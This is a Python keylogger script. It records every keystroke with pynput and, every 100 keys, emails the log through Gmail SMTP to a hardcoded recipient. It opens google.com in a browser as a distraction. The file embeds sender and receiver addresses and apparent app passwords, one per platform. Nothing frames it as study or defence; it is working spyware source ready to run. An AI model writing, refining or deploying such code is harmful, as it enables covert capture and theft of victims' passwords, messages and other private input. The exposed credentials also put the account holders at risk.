from pynput.keyboard import Listener
import smtplib, ssl
from sys import platform
import webbrowser

senderEmail = "semlabdev378@gmail.com"
receiverEmail = "oscarjsh18@gmail.com"

#To check which platform the user is using whether it is mac or windows 
if platform == "darwin":
    password = "gzzrsjaybybpfuba"
elif platform == "win32":
    password = "hjyxnsqvchzkstzo"

webbrowser.open("http://google.com")

keys,text,word_count = [],"",0

server = smtplib.SMTP_SSL("smtp.gmail.com", 465).login(senderEmail, password)

def on_press(key):
    global keys, text, word_count
    
    keys.append(key)
    word_count += 1
    
    if(word_count >= 100):
        word_count = 0
        write_file(keys)
        keys = []
        
def write_file(keys):
    #for writing the keystrokes into the log.txt file
    with open("log.txt", "w") as f:
        f.write("\n")
        for key in keys:
            (f.write(str(key).replace("'", "")) if ("'" in str(key)) else f.write(str(key).replace("Key.", " ") + " "))

    #for reading the data from log.txt file and converting the data from the text file into a string for sending it through email
    with open("log.txt", "r") as f:
        text = "".join(f.readlines())
        
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ssl.create_default_context()) as server: 
            server.login(senderEmail, password)
            server.sendmail(senderEmail, receiverEmail, text)

with Listener(on_press=on_press) as listener:
    listener.join()